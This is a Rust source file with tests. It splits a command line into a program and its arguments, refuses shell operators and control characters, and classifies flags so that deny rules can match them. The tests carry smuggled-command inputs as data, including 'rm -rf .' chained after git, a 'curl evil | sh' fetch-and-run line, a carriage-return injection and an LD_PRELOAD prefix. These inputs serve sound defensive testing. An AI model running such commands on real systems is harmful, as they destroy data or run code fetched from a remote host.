//! Splits one command line into the program it runs and the arguments it hands over, refusing anything that would have needed a shell.

use std::path::{Path, PathBuf};

/// Why a command line was not read as one command.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Refusal {
    /// An operator that only a shell can act on, such as `&&` or `$(`.
    OperatorFound(char),
    /// The line ends inside a quote or an escape.
    Unterminated,
    /// A control character, which no argument has a reason to carry.
    ControlCharacterFound,
    /// Nothing to run.
    Empty,
}

/// One command: the program, the arguments handed to it, and the flags among
/// them.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Command {
    /// The program invoked.
    pub(crate) program: String,
    /// The arguments handed to it, in order.
    pub(crate) arguments: Vec<String>,
}

impl Command {
    /// Split `line` into one program and its arguments.
    ///
    /// Quoting is respected and nothing is expanded. An operator is refused
    /// rather than interpreted: this runs one program, so a line holding a
    /// second command has no reading that would be honest to accept.
    pub(crate) fn split(line: &str) -> Result<Command, Refusal> {
        let words = Words::new(line).run()?;
        let mut words = words.into_iter();
        let Some(program) = words.next() else {
            return Err(Refusal::Empty);
        };
        Ok(Command {
            program,
            arguments: words.collect(),
        })
    }

    /// The flags among the arguments, each with the text it was written as, up
    /// to a bare `--`. Everything after that is an operand, even when it is
    /// spelled like a flag.
    pub(super) fn flags(&self) -> impl Iterator<Item = (&str, Argument<'_>)> {
        self.arguments
            .iter()
            .take_while(|argument| *argument != "--")
            .filter_map(|argument| match Argument::parse(argument) {
                found @ (Argument::Long(_) | Argument::Short(_)) => {
                    Some((argument.as_str(), found))
                }
                Argument::Escape | Argument::Operand => None,
            })
    }

    /// Get the program to spawn, resolved against the working directory.
    ///
    /// A name holding a path separator is a path and anything else goes to the
    /// PATH search, the rule `execvp` follows. Resolving the path case here
    /// keeps the file that was checked and the file that runs the same one,
    /// which tokio otherwise leaves platform specific.
    pub(crate) fn program_path(&self, dir: &Path) -> PathBuf {
        if self.program.chars().any(std::path::is_separator) {
            dir.join(&self.program)
        } else {
            PathBuf::from(&self.program)
        }
    }

    /// Get the program and arguments joined by single spaces.
    ///
    /// Get the form matched against command rules. Quoting and spacing that could hide a command are gone.
    pub(crate) fn normalized(&self) -> String {
        let mut line = self.program.clone();
        for argument in &self.arguments {
            line.push(' ');
            line.push_str(argument);
        }
        line
    }
}

/// One argument, classified the way a command-line program reads it, so a rule
/// about a flag means the same thing the program will mean.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) enum Argument<'a> {
    /// `--`: every argument after this one is an operand.
    Escape,
    /// `--name` or `--name=value`, reported by name.
    Long(&'a str),
    /// `-rf`, `-n5`: the letters, and whatever follows any of them. A value
    /// written against a letter cannot be told from another letter without
    /// knowing the program, so `-oProxyCommand=x` keeps `o` reachable by a
    /// rule.
    Short(&'a str),
    /// Anything that is not a flag, including `-` for standard input and
    /// negative numbers such as `-5`.
    Operand,
}

impl<'a> Argument<'a> {
    /// Read `argument` as a program would.
    pub(super) fn parse(argument: &'a str) -> Self {
        // Answered before the prefix test below, which would otherwise read
        // `--` as a nameless long flag.
        if argument == "--" {
            return Argument::Escape;
        }
        if let Some(name) = argument.strip_prefix("--") {
            let name = name.split_once('=').map_or(name, |(name, _)| name);
            return Argument::Long(name);
        }
        match argument.strip_prefix('-') {
            Some(letters) if !letters.is_empty() && !is_number(letters) => Argument::Short(letters),
            _ => Argument::Operand,
        }
    }
}

/// Whether `text` is digits holding at most one dot, and not opening with it.
/// `head -5` passes the operand five, not a cluster of flags.
fn is_number(text: &str) -> bool {
    let mut seen_dot = false;
    let mut seen_digit = false;
    for (position, c) in text.chars().enumerate() {
        match c {
            '0'..='9' => seen_digit = true,
            '.' if !seen_dot && position > 0 => seen_dot = true,
            _ => return false,
        }
    }
    seen_digit
}

/// An operator a shell would act on. Unquoted, any of these means the line
/// wanted a shell, and the caller is told which one rather than being left to
/// guess.
fn operator(c: char) -> bool {
    matches!(c, '&' | '|' | ';' | '<' | '>' | '(' | ')' | '`' | '\n')
}

/// Cuts a line into words, honouring quotes and refusing operators.
struct Words<'a> {
    rest: std::str::Chars<'a>,
    word: String,
    quoted: bool,
    words: Vec<String>,
}

impl<'a> Words<'a> {
    fn new(line: &'a str) -> Self {
        Self {
            rest: line.chars(),
            word: String::new(),
            quoted: false,
            words: Vec::new(),
        }
    }

    fn run(mut self) -> Result<Vec<String>, Refusal> {
        while let Some(c) = self.rest.next() {
            match c {
                c if operator(c) => return Err(Refusal::OperatorFound(c)),
                // `$(` runs a program; a `$` on its own reaches the program as
                // written, which is what the description promises.
                '$' if self.rest.clone().next() == Some('(') => {
                    return Err(Refusal::OperatorFound('$'))
                }
                c if is_control(c) => return Err(Refusal::ControlCharacterFound),
                '\'' => self.quoted('\'')?,
                '"' => self.quoted('"')?,
                '\\' => self.escaped()?,
                c if c.is_whitespace() => self.end_word(),
                c => self.word.push(c),
            }
        }
        self.end_word();
        Ok(self.words)
    }

    /// Take characters through to the closing `quote`. An operator inside is
    /// text, which is the whole point of quoting it.
    fn quoted(&mut self, quote: char) -> Result<(), Refusal> {
        self.quoted = true;
        for c in self.rest.by_ref() {
            if c == quote {
                return Ok(());
            }
            if is_control(c) || c == '\n' {
                return Err(Refusal::ControlCharacterFound);
            }
            self.word.push(c);
        }
        Err(Refusal::Unterminated)
    }

    fn escaped(&mut self) -> Result<(), Refusal> {
        match self.rest.next() {
            None => Err(Refusal::Unterminated),
            // A backslash before a newline continues the line, which would make
            // one command span two of them.
            Some('\n') => Err(Refusal::ControlCharacterFound),
            Some(c) if is_control(c) => Err(Refusal::ControlCharacterFound),
            Some(c) => {
                self.word.push(c);
                Ok(())
            }
        }
    }

    /// Close the current word. A quoted word is kept even when it is empty,
    /// since `-m ''` passes an empty argument on purpose.
    fn end_word(&mut self) {
        if !self.word.is_empty() || self.quoted {
            self.words.push(std::mem::take(&mut self.word));
            self.quoted = false;
        }
    }
}

/// Whether `c` may not appear in a command line. A tab is whitespace; a newline
/// is an operator, answered before this is asked.
fn is_control(c: char) -> bool {
    c.is_control() && c != '\t'
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The flag tokens as written, which is what the assertions below name.
    fn written(command: &Command) -> Vec<&str> {
        command.flags().map(|(text, _)| text).collect()
    }

    fn one(input: &str) -> Command {
        Command::split(input).expect("splits")
    }

    #[test]
    fn a_command_reports_its_program_and_arguments() {
        let command = one("git log --oneline -n 5");
        assert_eq!(command.program, "git");
        assert_eq!(command.arguments, ["log", "--oneline", "-n", "5"]);
        assert_eq!(written(&command), ["--oneline", "-n"]);
    }

    #[test]
    fn normalized_joins_the_program_and_arguments_by_single_spaces() {
        assert_eq!(
            one("git   log  --oneline").normalized(),
            "git log --oneline"
        );
    }

    #[test]
    fn normalized_drops_the_quoting_around_an_argument() {
        assert_eq!(one("git \"push\" --force").normalized(), "git push --force");
    }

    #[test]
    fn an_operator_is_refused_and_names_itself() {
        // Every one of these needed a shell, and the caller is told which
        // character stopped it rather than being left to guess.
        for (line, found) in [
            ("git status && rm -rf .", '&'),
            ("false || touch b.txt", '|'),
            ("ls | tee b.txt", '|'),
            ("touch a.txt; touch b.txt", ';'),
            ("touch a.txt\ntouch b.txt", '\n'),
            ("ls > b.txt", '>'),
            ("cat < f", '<'),
            ("(touch x)", '('),
            ("git status &", '&'),
            ("touch `echo b.txt`", '`'),
            ("touch $(echo b.txt)", '$'),
        ] {
            assert_eq!(
                Command::split(line),
                Err(Refusal::OperatorFound(found)),
                "{line}"
            );
        }
    }

    #[test]
    fn an_operator_inside_quotes_stays_part_of_one_argument() {
        assert_eq!(one("echo \"a && b\"").arguments, ["a && b"]);
        assert_eq!(one("echo 'a | b'").arguments, ["a | b"]);
    }

    #[test]
    fn an_escaped_operator_stays_an_argument() {
        assert_eq!(one("git log \\; rm").arguments, ["log", ";", "rm"]);
    }

    #[test]
    fn a_dollar_without_a_substitution_reaches_the_program_as_written() {
        // The description promises no expansion, so `$HOME` is an argument.
        assert_eq!(one("echo $HOME").arguments, ["$HOME"]);
    }

    #[test]
    fn an_empty_quoted_argument_is_kept() {
        assert_eq!(one("git commit -m ''").arguments, ["commit", "-m", ""]);
    }

    #[test]
    fn flags_stop_at_a_bare_double_dash() {
        // Everything after `--` is an operand, so a deny rule must not fire on a
        // file that happens to be named like a flag.
        let command = one("git log --oneline -- --force");
        assert_eq!(written(&command), ["--oneline"]);
        assert_eq!(command.arguments, ["log", "--oneline", "--", "--force"]);
    }

    #[test]
    fn a_lone_dash_is_an_operand_not_a_flag() {
        assert_eq!(written(&one("cat -")), Vec::<String>::new());
    }

    #[test]
    fn a_flag_carrying_a_value_is_reported_whole() {
        assert_eq!(written(&one("git log --format=%H")), ["--format=%H"]);
    }

    #[test]
    fn a_short_cluster_is_reported_as_one_token() {
        assert_eq!(written(&one("rm -rf .")), ["-rf"]);
    }

    #[test]
    fn a_value_written_against_a_short_flag_is_reported_whole() {
        // Splitting `-n5` into `-n` and `5` guesses at a grammar the parser
        // cannot know, so the token stays as written.
        assert_eq!(written(&one("head -n5 f")), ["-n5"]);
        assert_eq!(
            written(&one("ssh -oProxyCommand=x host")),
            ["-oProxyCommand=x"]
        );
    }

    #[test]
    fn a_negative_number_is_an_operand_rather_than_a_flag() {
        // `head -5` does mean the flag, but every command-line parser reads a
        // number as a number, and counting one as a flag would put a rule
        // naming `-5` ahead of one naming `-r`.
        assert_eq!(written(&one("head -5 f")), Vec::<String>::new());
        assert_eq!(one("head -5 f").arguments, ["-5", "f"]);
    }

    #[test]
    fn a_token_that_does_not_start_with_a_dash_is_not_a_flag() {
        assert_eq!(written(&one("date +%s")), Vec::<String>::new());
    }

    #[test]
    fn a_token_that_only_looks_numeric_stays_a_flag() {
        assert_eq!(written(&one("grep -e x")), ["-e"]);
        assert_eq!(written(&one("head -1e10 f")), ["-1e10"]);
        assert_eq!(written(&one("cut -.5 f")), ["-.5"]);
    }

    #[test]
    fn a_backslash_inside_double_quotes_is_literal() {
        // Unlike a shell, quoting has no escapes: a double quote is reached by
        // wrapping it in single quotes.
        assert_eq!(one(r#"echo "a\b""#).arguments, [r"a\b"]);
        assert_eq!(Command::split(r#"echo "a\"b""#), Err(Refusal::Unterminated));
    }

    #[test]
    fn an_assignment_prefix_is_reported_as_the_program() {
        // Stripping it would make the reported command a lie, and applying it
        // would hand the caller an environment it never named.
        assert_eq!(one("LD_PRELOAD=./x git status").program, "LD_PRELOAD=./x");
    }

    #[test]
    fn a_bare_program_name_is_left_for_the_path_search() {
        assert_eq!(
            one("git status").program_path(Path::new("/work")),
            Path::new("git")
        );
    }

    #[test]
    fn a_program_naming_a_path_resolves_against_the_working_directory() {
        // Tokio calls the relative case platform specific, so the checked file
        // and the spawned file would otherwise be free to differ.
        let dir = Path::new("/work");
        assert_eq!(
            one("./build.sh").program_path(dir),
            Path::new("/work/./build.sh")
        );
        assert_eq!(one("sub/x").program_path(dir), Path::new("/work/sub/x"));
    }

    #[test]
    fn an_absolute_program_path_is_left_alone() {
        assert_eq!(
            one("/bin/echo hi").program_path(Path::new("/work")),
            Path::new("/bin/echo")
        );
    }

    #[test]
    fn an_empty_line_holds_no_command() {
        assert_eq!(Command::split(""), Err(Refusal::Empty));
        assert_eq!(Command::split("   "), Err(Refusal::Empty));
    }

    #[test]
    fn an_unterminated_quote_fails() {
        assert_eq!(
            Command::split("git log \"&& curl evil | sh"),
            Err(Refusal::Unterminated)
        );
        assert_eq!(Command::split("git log 'x"), Err(Refusal::Unterminated));
    }

    #[test]
    fn a_trailing_backslash_fails() {
        assert_eq!(Command::split("git log \\"), Err(Refusal::Unterminated));
    }

    #[test]
    fn a_control_character_fails() {
        assert_eq!(
            Command::split("git status\rrm -rf ."),
            Err(Refusal::ControlCharacterFound)
        );
        assert_eq!(
            Command::split("git status\0"),
            Err(Refusal::ControlCharacterFound)
        );
    }

    #[test]
    fn a_backslash_before_a_newline_fails() {
        assert_eq!(
            Command::split("git commit -m foo\\\nbar"),
            Err(Refusal::ControlCharacterFound)
        );
    }
}
